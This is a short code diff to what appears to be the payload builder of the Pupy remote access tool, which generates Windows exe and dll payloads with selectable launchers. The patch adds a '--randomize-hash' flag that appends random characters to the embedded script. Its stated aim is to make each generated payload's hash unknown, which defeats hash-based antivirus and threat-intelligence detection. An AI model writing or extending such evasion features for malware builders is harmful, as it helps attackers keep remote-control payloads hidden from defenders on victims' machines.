@@ -9,6 +9,8 @@ import sys
 import os.path
 import re
 import shlex
+import random
+import string
 from pupylib.utils.network import get_local_ip
 from network.conf import transports, launchers
 from network.base_launcher import LauncherError
@@ -63,6 +65,7 @@ if __name__=="__main__":
 	parser.add_argument('-t', '--type', default='exe_x86', choices=['exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
 	parser.add_argument('-o', '--output', help="output path")
 	parser.add_argument('-s', '--offline-script', help="offline python script to execute before starting the connection")
+	parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
 	parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
 	parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")
 
@@ -88,6 +91,8 @@ if __name__=="__main__":
 	if args.offline_script:
 		with open(args.offline_script,'r') as f:
 			script_code=f.read()
+	if args.randomize_hash:
+		script_code+="\n#%s\n"%''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))
 	outpath=None
 	conf={}
 	conf['launcher']=args.launcher
